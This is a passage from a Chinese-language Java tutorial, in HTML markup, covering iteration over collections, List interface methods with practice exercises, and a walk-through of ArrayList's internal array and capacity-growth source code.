&#123;<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">90</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : nums)&#123;<br>        System.out.println(<span class="hljs-string">&quot;i=&quot;</span>+i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">book</span>=Book&#123;<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;三国演义&#x27;</span>, <span class="hljs-attribute">author</span>=<span class="hljs-string">&#x27;罗贯中&#x27;</span>, <span class="hljs-attribute">price</span>=10.1&#125;<br><span class="hljs-attribute">book</span>=Book&#123;<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;小李飞刀&#x27;</span>, <span class="hljs-attribute">author</span>=<span class="hljs-string">&#x27;古龙&#x27;</span>, <span class="hljs-attribute">price</span>=5.1&#125;<br><span class="hljs-attribute">book</span>=Book&#123;<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;红楼梦&#x27;</span>, <span class="hljs-attribute">author</span>=<span class="hljs-string">&#x27;曹雪芹&#x27;</span>, <span class="hljs-attribute">price</span>=34.6&#125;<br><span class="hljs-attribute">i</span>=1<br><span class="hljs-attribute">i</span>=8<br><span class="hljs-attribute">i</span>=10<br><span class="hljs-attribute">i</span>=90<br></code></pre></td></tr></table></figure><p>增强for，底层仍然是迭代器，可以理解为简化版版本的 迭代器遍历</p><p>快捷键：I</p><h3 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h3><blockquote><p> 请编写程序 CollectionExercise.java<br>1.创建 3个 Dog ｛name， age｝对象，放入到 ArrayList 中，赋给List 引用<br>2.用迭代器和增强for循环两种方式来遍历<br>3.重写Dog的toString方法，输出name和age</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CollectionExercise</span> &#123;<br>    <span class="hljs-comment">//1.创建 3个 Dog ｛name， age｝对象，放入到 ArrayList 中，赋给List 引用</span><br>    <span class="hljs-comment">//2.用迭代器和增强for循环两种方式来遍历</span><br>    <span class="hljs-comment">//3.重写Dog的toString方法，输出name和age</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;tom&quot;</span>,<span class="hljs-number">1</span>));<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;pat&quot;</span>,<span class="hljs-number">3</span>));<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;jack&quot;</span>,<span class="hljs-number">2</span>));<br><br>        System.out.println(<span class="hljs-string">&quot;==迭代器==&quot;</span>);<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> list.iterator();<br>        <span class="hljs-keyword">while</span>(iterator.hasNext())&#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> iterator.next();<br>            System.out.println(obj.toString());<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;==增强for===&quot;</span>);<br>        <span class="hljs-keyword">for</span>(Object dog : list)&#123;<br>            System.out.println(dog.toString());<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Dog&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-List接口"><a href="#3-List接口" class="headerlink" title="3.List接口"></a>3.List接口</h2><p>1）List集合类中元素有序（即添加顺序和取出顺序一致）、且可重复 </p><p>2） List集合中的每个元素都有其对应的顺序索引，即支持索引。</p><p>3）List容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根<br>据序号存取容器中的元素。</p><blockquote><h2 id="Interface-List"><a href="#Interface-List" class="headerlink" title="Interface List"></a>Interface List<E></h2><ul><li><ul><li><p><strong>参数类型</strong></p><p><code>E</code> - 此列表中元素的类型 </p></li><li><p>All Superinterfaces: </p><p><a href="itss://chm/java/util/Collection.html">Collection</a> <E>， <a href="itss://chm/java/lang/Iterable.html">Iterable</a> <E></p></li><li><p>所有已知实现类：</p><p><a href="itss://chm/java/util/AbstractList.html">AbstractList</a> ， <a href="itss://chm/java/util/AbstractSequentialList.html">AbstractSequentialList</a> ， <a href="itss://chm/java/util/ArrayList.html">ArrayList</a> ， <a href="itss://chm/javax/management/AttributeList.html">AttributeList</a> ， <a href="itss://chm/java/util/concurrent/CopyOnWriteArrayList.html">CopyOnWriteArrayList</a> ， <a href="itss://chm/java/util/LinkedList.html">LinkedList</a> ， <a href="itss://chm/javax/management/relation/RoleList.html">RoleList</a> ， <a href="itss://chm/javax/management/relation/RoleUnresolvedList.html">RoleUnresolvedList</a> ， <a href="itss://chm/java/util/Stack.html">Stack</a>， <a href="itss://chm/java/util/Vector.html">Vector</a></p></li></ul></li></ul></blockquote><p>常见的实现类有ArrayList、LinkedList和Vector，除此之外已知的实现类还有很多。</p><h3 id="List常用方法"><a href="#List常用方法" class="headerlink" title="List常用方法"></a>List常用方法</h3><ol><li>void <strong>add</strong>(int index， Object ele):在index位置<strong>插入</strong>ele元素</li><li>boolean <strong>addAll</strong>(int index， Collection eles):从index位置开始将eles中的所有元素<strong>添加</strong>进来</li><li>Object <strong>get</strong>(int index):获取<strong>指定index位置</strong>的元素</li><li>int <strong>indexOf</strong>(Object obj):返回obj在集合中<strong>首次出现</strong>的位置</li><li>int <strong>lastlndexOf</strong>(Object obj):返回obj在当前集合中<strong>末次出现</strong>的位置</li><li>Object <strong>remove</strong>(int index):<strong>移除</strong>指定index位置的元素，并返回此元素</li><li>Object <strong>set</strong>(int index， Object ele):设置指定index位置的元素为ele,相当于是替换.</li><li>List <strong>subList</strong>(int fromIndex，int tolndex):返回从fromIndex到tolndex位置的子集合（前开后闭）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        list.add(<span class="hljs-string">&quot;张三丰&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;贾宝玉&quot;</span>);<br><span class="hljs-comment">//        1)void add(int index， Object ele):在index位置插入ele元素</span><br>        <span class="hljs-comment">//在index=1的位置插入</span><br>        list.add(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;韩顺平&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;list=&quot;</span>+list);<br><span class="hljs-comment">//        2)boolean addAll(int index， Collection eles):从index位置开始将eles中的所有元素添加进来</span><br>        <span class="hljs-type">List</span> <span class="hljs-variable">list2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        list2.add(<span class="hljs-string">&quot;jack&quot;</span>);<br>        list2.add(<span class="hljs-string">&quot;tom&quot;</span>);<br>        list.addAll(<span class="hljs-number">1</span>,list2);<br>        System.out.println(<span class="hljs-string">&quot;list=&quot;</span>+list);<br><span class="hljs-comment">//        3)Object get(int index):获取指定index位置的元素</span><br><span class="hljs-comment">//        4)int indexOf(Object obj):返回obj在集合中首次出现的位置</span><br>        System.out.println(list.indexOf(<span class="hljs-string">&quot;tom&quot;</span>)); <span class="hljs-comment">//2</span><br><span class="hljs-comment">//        5)int lastlndexOf(Object obj):返回obj在当前集合中末次出现的位置</span><br>        list.add(<span class="hljs-string">&quot;韩顺平&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;list=&quot;</span>+list);<br>        System.out.println(list.lastIndexOf(<span class="hljs-string">&quot;韩顺平&quot;</span>));<br><span class="hljs-comment">//        6)Object remove(int index):移除指定index位置的元素，并返回此元素</span><br>        list.remove(<span class="hljs-number">0</span>);<br>        System.out.println(<span class="hljs-string">&quot;list=&quot;</span>+list);<br><span class="hljs-comment">//        7)Object set(int index， Object ele):设置指定index位置的元素为ele,相当于是替换.</span><br>        list.set(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;玛丽&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;list=&quot;</span>+list);<br><span class="hljs-comment">//        8)List subList(int fromIndex，int tolndex):返回从fromIndex到tolndex位置的子集合</span><br>        <span class="hljs-comment">//前开后闭</span><br>        <span class="hljs-type">List</span> <span class="hljs-variable">returnlist</span> <span class="hljs-operator">=</span> list.subList(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>        System.out.println(<span class="hljs-string">&quot;returnlist=&quot;</span>+returnlist);<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230228222455417.png" alt="image-20230228222455417" style="zoom:50%;" /><h4 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h4><blockquote><p>添加10个以上的元素（比如String “hello＂），</p><p>在2号位插入一个元素＂韩顺平教育＂，</p><p>获得第5个元素，删除第6个元素，修改第7个元素，</p><p>在使用迭代器遍历集合.</p><p>要求：使用List的实现类ArrayList完成。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++) &#123;<br>    list.add(<span class="hljs-string">&quot;hello&quot;</span>+i);<br>&#125;<br>System.out.println(list);<br>list.add(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;韩顺平教育&quot;</span>);<br>System.out.println(list.get(<span class="hljs-number">4</span>));<br>list.remove(<span class="hljs-number">5</span>);<br>list.set(<span class="hljs-number">6</span>,<span class="hljs-string">&quot;三国演义&quot;</span>);<br><span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> list.iterator();<br><span class="hljs-keyword">while</span>(iterator.hasNext())&#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> iterator.next();<br>    System.out.println(<span class="hljs-string">&quot;obj=&quot;</span>+obj);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="list的三种遍历方式（ArrayList，LinkedList，Vector）"><a href="#list的三种遍历方式（ArrayList，LinkedList，Vector）" class="headerlink" title="list的三种遍历方式（ArrayList，LinkedList，Vector）"></a>list的三种遍历方式（ArrayList，LinkedList，Vector）</h3><ol><li><p>方式一：使用iterator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> list.iterator();<br><span class="hljs-keyword">while</span> (iterator.hasNext())&#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> iterator.next();<br>    System.out.println(obj);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>方式二：增强for</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Object o : list) &#123;<br>    System.out.println(<span class="hljs-string">&quot;o=&quot;</span>+o);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>方式三：普通for</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; list.size(); i++) &#123;<br>    System.out.println(<span class="hljs-string">&quot;对象：&quot;</span>+list.get(i));<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h4 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h4><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230301112321131.png" alt="image-20230301112321131"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;红楼梦&quot;</span>,<span class="hljs-string">&quot;曹雪芹&quot;</span>,<span class="hljs-number">100</span>));<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;西游记&quot;</span>,<span class="hljs-string">&quot;吴承恩&quot;</span>,<span class="hljs-number">10</span>));<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;施耐庵&quot;</span>,<span class="hljs-string">&quot;水浒传&quot;</span>,<span class="hljs-number">9</span>));<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;三国演义&quot;</span>,<span class="hljs-string">&quot;罗贯中&quot;</span>,<span class="hljs-number">80</span>));<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;西游记&quot;</span>,<span class="hljs-string">&quot;吴承恩&quot;</span>,<span class="hljs-number">10</span>));<br>        <span class="hljs-comment">//排序</span><br>        sort_Book(list);<br>        <span class="hljs-keyword">for</span> (Object o :list) &#123;<br>            System.out.println(o);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-comment">//静态方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sort_Book</span><span class="hljs-params">(List list)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">list_size</span> <span class="hljs-operator">=</span> list.size();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; list_size-<span class="hljs-number">1</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; list_size-<span class="hljs-number">1</span>-i; j++) &#123;<br>                <span class="hljs-comment">//取出对象Book</span><br>                <span class="hljs-type">Book</span> <span class="hljs-variable">book1</span> <span class="hljs-operator">=</span> (Book) list.get(j);<br>                <span class="hljs-type">Book</span> <span class="hljs-variable">book2</span> <span class="hljs-operator">=</span> (Book) list.get(j+<span class="hljs-number">1</span>);<br>                <span class="hljs-keyword">if</span> (book1.getPrice()&gt;book2.getPrice())&#123;<br>                    list.set(j,book2);<br>                    list.set(j+<span class="hljs-number">1</span>,book1);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Book</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String author;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> price;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;名称：&quot;</span> + name + <span class="hljs-string">&quot;\t\t价格&quot;</span> + price + <span class="hljs-string">&quot;\t\t作者=&quot;</span> + author;<br>    &#125;<br>  <br>  <span class="hljs-comment">/*** 省略构造器、setget ***/</span><br></code></pre></td></tr></table></figure><p>思路：使用静态方法进行排序，用get取出list元素，向下转型，再进行比较。</p><h2 id="4-ArrayList"><a href="#4-ArrayList" class="headerlink" title="4.ArrayList"></a>4.ArrayList</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayList</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractList</span>&lt;E&gt;<br>        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">List</span>&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable<br></code></pre></td></tr></table></figure><h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a><strong>注意事项：</strong></h3><ol><li><p>permits all elements，including null（允许所有元素，包括空）。</p><p>ArrayList 可以加入null，并且可存放多个null</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">arrayList.add(<span class="hljs-literal">null</span>);<br>arrayList.add(<span class="hljs-literal">null</span>);<br><span class="hljs-comment">//是可行的</span><br></code></pre></td></tr></table></figure></li><li><p>ArrayList 是由数组来实现数据存储的</p></li><li><p>ArrayList 基本等同于Vector，除了 <strong>ArrayList是线程不安全</strong>（执行效率高）[看源码,没有synchronized]．</p><p>在多线程情况下，不建议使用ArrayList</p></li></ol><h3 id="底层逻辑和源码分析"><a href="#底层逻辑和源码分析" class="headerlink" title="底层逻辑和源码分析"></a>底层逻辑和源码分析</h3><ol><li><p>ArrayList中维护了一个<strong>Object类型</strong>的数组elementData.［debug 看源码］</p><p>transient Object［］ elementData； </p><p>transient表示该属性不会被序列化。</p></li><li><p>当创建ArrayList对象时，<strong>如果使用的是无参构造器</strong>，则初始elementData容量为0。第<strong>1</strong>次添加，则扩容elementData为<strong>10</strong>，如需要<strong>再次</strong>扩容，则扩容elementData为<strong>1.5倍</strong>。</p></li><li><p>如果使用的是<strong>指定大小的构造器</strong>，则初始elementData容量为指定大小，如果需要<strong>扩容</strong>，则直接扩容elementData为<strong>1.5倍</strong>。</p></li></ol><p><strong>案例及分析：</strong></p><h4 id="分析使用无参构造器的ArrayList源码"><a href="#分析使用无参构造器的ArrayList源码" class="headerlink" title="分析使用无参构造器的ArrayList源码"></a>分析使用无参构造器的ArrayList源码</h4><p><strong>案例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ArrayList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(); <span class="hljs-comment">//①</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<span class="hljs-comment">//②</span><br>    list.add(i);<span class="hljs-comment">//③</span><br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>; i &lt; <span class="hljs-number">15</span>; i++) &#123;<br>    list.add(i);<br>&#125;<br>list.add(<span class="hljs-number">100</span>);<br>list.add(<span class="hljs-number">200</span>);<br>list.add(<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p><strong>①</strong>首先新建ArrayList</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ArrayList</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看 DEFAULTCAPACITY_EMPTY_ELEMENTDATA。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Shared empty array instance used for default sized empty instances. We</span><br><span class="hljs-comment"> * distinguish this from EMPTY_ELEMENTDATA to know how much to inflate when</span><br><span class="hljs-comment"> * first element is added.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;;<br></code></pre></td></tr></table></figure><p>发现是一个空数组。</p><p>也就意味着，elementData的初始化是空数组。</p><p><strong>②</strong>程序往下走，进入循环。第一次进入，先装箱。</p><p><strong>③</strong>然后调用add方法，查看add源码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Appends the specified element to the end of this list.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> e element to be appended to this list</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> &lt;tt&gt;true&lt;/tt&gt; (as specified by &#123;<span class="hljs-doctag">@link</span> Collection#add&#125;)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E e)</span> &#123;<br>    ensureCapacityInternal(size + <span class="hljs-number">1</span>);  <span class="hljs-comment">// Increments modCount!!</span><br>    elementData[size++] = e;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ensureCapacityInternal：确认容量是否足够。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ensureCapacityInternal</span><span class="hljs-params">(<span class="hljs-type">int</span> minCapacity)</span> &#123;<br>    ensureExplicitCapacity(calculateCapacity(elementData, minCapacity)); <span class="hljs-comment">//确认minCapacity大小，第一次扩容为10（具体步骤见下）</span><br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateCapacity</span><span class="hljs-params">(Object[] elementData, <span class="hljs-type">int</span> minCapacity)</span> &#123;  <span class="hljs-comment">//确定minCapacity</span><br>        <span class="hljs-keyword">if</span> (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123;<span class="hljs-comment">//如果elementData为空数组</span><br>            <span class="hljs-keyword">return</span> Math.max(DEFAULT_CAPACITY, minCapacity);<br>          <span class="hljs-comment">//返回DEFAULT_CAPACITY（10）和minCapacity（1）中的最大值，也就是10</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> minCapacity;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ensureExplicitCapacity</span><span class="hljs-params">(<span 